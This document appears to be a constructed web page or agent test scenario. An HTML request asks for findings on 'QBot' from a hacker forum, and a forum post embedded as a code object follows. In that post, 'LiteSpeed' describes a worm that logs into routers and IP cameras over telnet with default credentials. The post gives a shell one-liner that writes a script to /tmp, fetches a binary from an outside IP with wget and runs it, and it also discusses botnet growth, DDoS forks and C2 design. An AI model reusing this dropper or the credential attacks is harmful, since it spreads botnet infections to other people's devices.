            <p>I've been spending some time investigating a series of increasingly frequent, large-scale hacking attempts that have been hitting networks daily. The patterns are wide-ranging, and it's clear they're not random.</p>
            <p>While digging around online, I came across this forum: <strong>hackerforum.com</strong>.</p>
            <p>It's an open web platform where (what seems like) young attackers openly brag about their exploits, trade toolkits, and sell access to compromised systems. It's chaotic - but fascinating.</p>
            <p>Interestingly, there's a lot of chatter about something called <strong>QBot</strong> - a malware strain that seems to be involved in many of these attacks. Some users claim to have developed it, or at least modified versions.</p>
            <p><strong>Email me back</strong> with what else you learn about <strong>QBots</strong> through the hacker forum.</p>

    author: { id: 0, username: "LiteSpeed" },
    content: `<p>Hello all,</p>
              <p>So I‚Äôve been experimenting with a small worm I built called <strong>QBot</strong> - mainly targeting cheap routers and IP cams. Most of these things run outdated firmware and use default creds like <code>admin:admin</code> or <code>root:1234</code>. Lazy af.</p>
              <p>Anyway, QBot scans a range of IPs looking for open telnet ports. Once it lands on one, it logs in and uses <code>echo</code> commands to write a shell script line-by-line into <code>/tmp/qbot.sh</code>, then executes it to fetch the main binary.</p>
              <p>Sample payload drop:</p>
              <pre><code>(echo "#!/bin/sh"; 
              echo "wget http://123.45.67.89/qbot.mips -O /tmp/q"; 
              echo "chmod +x /tmp/q"; 
              echo "/tmp/q") > /tmp/qbot.sh && sh /tmp/qbot.sh</code></pre>
              <p>The worm is light - like 10KB - but it propagates crazy fast on old netgear and zyxel routers. Started with a few seed IPs and within hours, I had a couple hundred bots pinging back.</p>
              <p>Wasn‚Äôt planning to release it, but someone I trusted leaked the binary. Now I‚Äôm seeing forks of it with DDoS modules slapped on. Funny how quick things evolve. Some are adding domain flux, HTTP C2, and watchdogs.</p>
              <p>Might rethink the whole architecture - centralize the loader, handle scanning separately, and just maintain persistent C2s. Still playing with ideas.<br />
              ‚Äì LiteSpeed</p>
              <p><em>P.S. stay off shodan when testing. Someone‚Äôs always watching.</em></p>`,
